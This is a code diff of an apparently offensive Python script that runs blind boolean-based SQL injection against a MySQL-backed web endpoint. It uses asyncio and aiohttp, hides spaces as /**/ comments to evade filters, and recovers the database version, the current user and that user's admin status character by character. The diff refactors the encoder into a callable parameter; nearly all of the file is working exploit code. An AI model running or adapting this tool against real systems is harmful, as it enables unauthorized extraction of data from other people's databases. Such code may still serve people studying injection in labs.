@@ -1,13 +1,10 @@
 import asyncio
-from re import A
-from types import coroutine
 from urllib import response
+from collections.abc import Callable
 import aiohttp
-from hashlib import sha1
 from typing import List, Iterable
 try:
     import uvloop
-
     uvloop.install()
 except:
     pass
@@ -18,7 +15,7 @@ COMMENT="%23"
 #sqli = lambda url, query, comment: F"{url}test') OR ({query}){comment}".replace(' ','/**/')
 blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
 blind_sqli_falsy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=2,({sub_query}),1)){comment}"
-ENCODE = lambda s: s.replace(' ','/**/')
+
 QUERIES = {
     'DB_VERSION': "select version()",
     'STR_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
@@ -45,12 +42,11 @@ def response_truth_condition(response):
     if (content_length == 180):
         return True
     return False
-
 async def blind_query(session:aiohttp.client.ClientSession,  truth_condition,
                       ip:str, sub_query:str, ordinal:str = "",
-                      encode:bool=False, debug:bool=False
+                      query_encoder:Callable[[str], str]=None, debug:bool=False
                       ):
-    target = ENCODE(blind_sqli_truthy(ip,sub_query, COMMENT)) if encode else blind_sqli_truthy(ip, sub_query, COMMENT)
+    target = query_encoder(blind_sqli_truthy(ip,sub_query, COMMENT)) if query_encoder else blind_sqli_truthy(ip, sub_query, COMMENT)
     try:
         async with session.get(target) as res:
             if debug == True:
@@ -64,9 +60,9 @@ async def blind_query(session:aiohttp.client.ClientSession,  truth_condition,
         return False
 async def blind_query_binary_search(session:aiohttp.client.ClientSession,  truth_condition,
                       ip:str, sub_query:str, sub_query_cmp_value:str = "",
-                      encode:bool=False, debug:bool=False
+                      query_encoder:Callable[[str], str]=None, debug:bool=False
                       ):
-    target = ENCODE(blind_sqli_truthy(ip,sub_query, COMMENT)) if encode else blind_sqli_truthy(ip, sub_query, COMMENT)
+    target = query_encoder(blind_sqli_truthy(ip,sub_query, COMMENT)) if query_encoder else blind_sqli_truthy(ip, sub_query, COMMENT)
     try:
         async with session.get(target) as res:
             if debug == True:
@@ -78,13 +74,13 @@ async def blind_query_binary_search(session:aiohttp.client.ClientSession,  truth
             return False
     except aiohttp.client_exceptions.ServerDisconnectedError:
         return False   
-async def question(sub_query: str):
+async def question(sub_query: str, query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
-        return await blind_query(session, response_truth_condition, SQL_URL, sub_query, encode=True)
-async def get_length(sub_query: str, lower_bound: int = 1, upper_bound: int = 65):
+        return await blind_query(session, response_truth_condition, SQL_URL, sub_query, query_encoder=query_encoder)
+async def get_length(sub_query: str, lower_bound: int = 1, upper_bound: int = 65, query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
         cr_length = [
-            blind_query(session, response_truth_condition, SQL_URL, QUERIES['LENGTH_EXFIL'](sub_query,i), str(i), True)
+            blind_query(session, response_truth_condition, SQL_URL, QUERIES['LENGTH_EXFIL'](sub_query,i), str(i), query_encoder=query_encoder)
             for i in range(lower_bound, upper_bound)
         ]
         strlen = int(await run_until_found(cr_length))
@@ -93,10 +89,10 @@ async def get_length(sub_query: str, lower_bound: int = 1, upper_bound: int = 65
         except:
             print(F"(+) Could not determine length of subquery [{sub_query}].")
             exit(1)
-async def get_count(sub_query: str,lower_bound: int = 0, upper_bound: int = 1000):
+async def get_count(sub_query: str,lower_bound: int = 0, upper_bound: int = 1000,query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
         cr_count = [
-            blind_query(session, response_truth_condition, SQL_URL, QUERIES['COUNT_EXFIL'](sub_query,i), str(i), True)
+            blind_query(session, response_truth_condition, SQL_URL, QUERIES['COUNT_EXFIL'](sub_query,i), str(i), query_encoder=query_encoder)
             for i in range(lower_bound, upper_bound)
         ]
         count = int(await run_until_found(cr_count))
@@ -105,19 +101,19 @@ async def get_count(sub_query: str,lower_bound: int = 0, upper_bound: int = 1000
         except:
             print(F"(+) Could not determine count of subquery [{sub_query}].")
             exit(1)
-async def binary_search(session:aiohttp.client.ClientSession, lo, hi, sub_query, position):
+async def binary_search(session:aiohttp.client.ClientSession, lo, hi, sub_query, position, query_encoder:Callable[[str], str]=None):
     while lo <= hi:
         mid = lo + (hi - lo) // 2
-        res = await blind_query(session, response_truth_condition, SQL_URL, QUERIES['STR_EXFIL'](sub_query,position,mid), mid, True)
+        res = await blind_query(session, response_truth_condition, SQL_URL, QUERIES['STR_EXFIL'](sub_query,position,mid), mid, query_encoder=query_encoder)
         if (res):
             lo = mid + 1
         else:
             hi = mid - 1
     return lo
-async def get_string(sub_query:str, strlen: int):
+async def get_string(sub_query:str, strlen: int, query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
         tasks = [
-            binary_search(session, 32,126, sub_query, i)
+            binary_search(session, 32,126, sub_query, i, query_encoder=query_encoder)
             for i in range(1, strlen+1)
         ]
         s = list(await asyncio.gather(*tasks))
@@ -128,15 +124,15 @@ async def get_string(sub_query:str, strlen: int):
         except:
             print(F"(+) Could not exfil string with subquery [{sub_query}].")
             exit(1)
-async def report():
-    version_strlen = await get_length("select version()")
+async def report(query_encoder:Callable[[str], str]=None):
+    version_strlen = await get_length("select version()", query_encoder=query_encoder)
     print("(+) DB Version strlen: ", version_strlen)
-    print(F"(+) MySQL Version: {await get_string('select version()', version_strlen)}")
-    db_user_strlen = await get_length("select current_user()")
+    print(F"(+) MySQL Version: {await get_string('select version()', version_strlen, query_encoder=query_encoder)}")
+    db_user_strlen = await get_length("select current_user()", query_encoder=query_encoder)
     print("(+) Current DB User strlen: ", db_user_strlen)
-    db_user = await  get_string("select current_user()", db_user_strlen)
+    db_user = await  get_string("select current_user()", db_user_strlen, query_encoder=query_encoder)
     print(F"(+) Current DB User: {db_user}")
-    print(F"(+) Current User is DB Admin?: {await question(QUERIES['CURRENT_USER_IS_DB_ADMIN'](db_user))}")
+    print(F"(+) Current User is DB Admin?: {await question(QUERIES['CURRENT_USER_IS_DB_ADMIN'](db_user), query_encoder=query_encoder)}")
     '''
     num_tables = await get_count("SELECT COUNT(table_name) FROM information_schema.tables")
     print(num_tables)
@@ -149,7 +145,7 @@ async def report():
         print(tables[i], ":", table_name_lengths[i])
     '''
 try:
-    asyncio.run(report())
+    asyncio.run(report(lambda s: s.replace(' ','/**/')))
 # https://github.com/MagicStack/uvloop/issues/349
 except NotImplementedError:
     pass
